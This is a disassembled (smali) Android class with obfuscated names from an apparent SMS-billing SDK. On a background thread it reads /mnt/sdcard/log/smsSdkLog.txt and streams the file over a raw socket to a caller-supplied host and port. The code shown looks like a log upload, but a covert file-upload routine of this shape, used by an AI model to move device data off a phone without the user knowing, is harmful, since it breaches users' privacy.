.class Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;
.super Ljava/lang/Thread;


# instance fields
.field private final _$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

.field private final _$2:Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;

.field private final _$3:Ljava/lang/String;

.field private final _$4:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/infinit/multimode_billing5/net/AsyncMultimode;Ljava/lang/String;Ljava/lang/String;Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;)V
    .locals 0

    iput-object p1, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

    iput-object p2, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$4:Ljava/lang/String;

    iput-object p3, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$3:Ljava/lang/String;

    iput-object p4, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$2:Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    const/4 v6, 0x0

    const/4 v1, 0x0

    iget-object v0, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

    iget v0, v0, Lcom/infinit/multimode_billing5/net/AsyncMultimode;->BUF_SIZE:I

    new-array v7, v0, [B

    :try_start_0
    new-instance v5, Ljava/net/Socket;

    iget-object v0, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$4:Ljava/lang/String;

    iget-object v2, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$3:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-direct {v5, v0, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/16 v0, 0x3a98

    :try_start_1
    invoke-virtual {v5, v0}, Ljava/net/Socket;->setSoTimeout(I)V

    new-instance v0, Ljava/io/File;

    const-string v2, "/mnt/sdcard/log"

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    const-string v3, "/mnt/sdcard/log/smsSdkLog.txt"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->mkdirs()Z

    :cond_0
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->createNewFile()Z

    :cond_1
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, v2}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_a
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    :try_start_2
    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_b
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    move-result-object v2

    :try_start_3
    new-instance v3, Ljava/io/PrintWriter;

    invoke-direct {v3, v2}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_c
    .catchall {:try_start_3 .. :try_end_3} :catchall_3

    :try_start_4
    invoke-virtual {v4}, Ljava/io/FileInputStream;->available()I

    move-result v1

    invoke-virtual {v3, v1}, Ljava/io/PrintWriter;->println(I)V

    iget-object v0, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

    iget v0, v0, Lcom/infinit/multimode_billing5/net/AsyncMultimode;->BUF_SIZE:I

    div-int v0, v1, v0

    iget-object v8, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

    iget v8, v8, Lcom/infinit/multimode_billing5/net/AsyncMultimode;->BUF_SIZE:I

    rem-int/2addr v1, v8

    if-eqz v1, :cond_2

    add-int/lit8 v0, v0, 0x1

    :cond_2
    move v1, v6

    :goto_0
    if-ge v1, v0, :cond_3

    const/4 v6, 0x0

    iget-object v8, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$1:Lcom/infinit/multimode_billing5/net/AsyncMultimode;

    iget v8, v8, Lcom/infinit/multimode_billing5/net/AsyncMultimode;->BUF_SIZE:I

    invoke-virtual {v4, v7, v6, v8}, Ljava/io/FileInputStream;->read([BII)I

    move-result v6

    const/4 v8, 0x0

    invoke-virtual {v2, v7, v8, v6}, Ljava/io/OutputStream;->write([BII)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_3
    iget-object v0, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$2:Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;

    const-string v1, "success"

    invoke-interface {v0, v1}, Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;->onComplete(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_d
    .catchall {:try_start_4 .. :try_end_4} :catchall_4

    if-eqz v5, :cond_4

    :try_start_5
    invoke-virtual {v5}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_7

    :cond_4
    :goto_1
    if-eqz v4, :cond_5

    :try_start_6
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_8

    :cond_5
    :goto_2
    if-eqz v3, :cond_6

    invoke-virtual {v3}, Ljava/io/PrintWriter;->close()V

    :cond_6
    if-eqz v2, :cond_7

    :try_start_7
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_9

    :cond_7
    :goto_3
    return-void

    :catch_0
    move-exception v0

    move-object v2, v1

    move-object v3, v1

    move-object v4, v1

    :goto_4
    :try_start_8
    iget-object v5, p0, Lcom/infinit/multimode_billing5/net/llIllllIIIIIlllI;->_$2:Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;

    invoke-interface {v5, v0}, Lcom/infinit/multimode_billing5/net/AsyncMultimode$RequestListener;->onError(Ljava/lang/Exception;)V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_5

    if-eqz v4, :cond_8

    :try_start_9
    invoke-virtual {v4}, Ljava/net/Socket;->close()V
    :try_end_9
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_5

    :cond_8
    :goto_5
    if-eqz v3, :cond_9

    :try_start_a
    invoke-virtual {v3}, Ljava/io/FileInputStream;->close()V
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_6

    :cond_9
    :goto_6
    if-eqz v2, :cond_a

    invoke-virtual {v2}, Ljava/io/PrintWriter;->close()V

    :cond_a
    if-eqz v1, :cond_7

    :try_start_b
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_b
    .catch Ljava/io/IOException; {:try_start_b .. :try_end_b} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    :goto_7
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_3

    :catchall_0
    move-exception v0

    move-object v3, v1

    move-object v4, v1

    move-object v5, v1

    :goto_8
    if-eqz v5, :cond_b

    :try_start_c
    invoke-virtual {v5}, Ljava/net/Socket;->close()V
    :try_end_c
    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_2

    :cond_b
    :goto_9
    if-eqz v4, :cond_c

    :try_start_d
    invoke-virtual {v4}, Ljava/io/FileInputStream;->close()V
    :try_end_d
    .catch Ljava/io/IOException; {:try_start_d .. :try_end_d} :catch_3

    :cond_c
    :goto_a
    if-eqz v3, :cond_d

    invoke-virtual {v3}, Ljava/io/PrintWriter;->close()V

    :cond_d
    if-eqz v1, :cond_e

    :try_start_e
    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_e
    .catch Ljava/io/IOException; {:try_start_e .. :try_end_e} :catch_4

    :cond_e
    :goto_b
    throw v0

    :catch_2
    move-exception v2

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_9

    :catch_3
    move-exception v2

    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_a

    :catch_4
    move-exception v1

    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_b

    :catch_5
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_5

    :catch_6
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_6

    :catch_7
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    :catch_8
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2

    :catch_9
    move-exception v0

    goto :goto_7

    :catchall_1
    move-exception v0

    move-object v3, v1

    move-object v4, v1

    goto :goto_8

    :catchall_2
    move-exception v0

    move-object v3, v1

    goto :goto_8

    :catchall_3
    move-exception v0

    move-object v3, v1

    move-object v1, v2

    goto :goto_8

    :catchall_4
    move-exception v0

    move-object v1, v2

    goto :goto_8

    :catchall_5
    move-exception v0

    move-object v5, v4

    move-object v4, v3

    move-object v3, v2

    goto :goto_8

    :catch_a
    move-exception v0

    move-object v2, v1

    move-object v3, v1

    move-object v4, v5

    goto :goto_4

    :catch_b
    move-exception v0

    move-object v2, v1

    move-object v3, v4

    move-object v4, v5

    goto :goto_4

    :catch_c
    move-exception v0

    move-object v3, v4

    move-object v4, v5

    move-object v9, v2

    move-object v2, v1

    move-object v1, v9

    goto :goto_4

    :catch_d
    move-exception v0

    move-object v1, v2

    move-object v2, v3

    move-object v3, v4

    move-object v4, v5

    goto/16 :goto_4
.end method
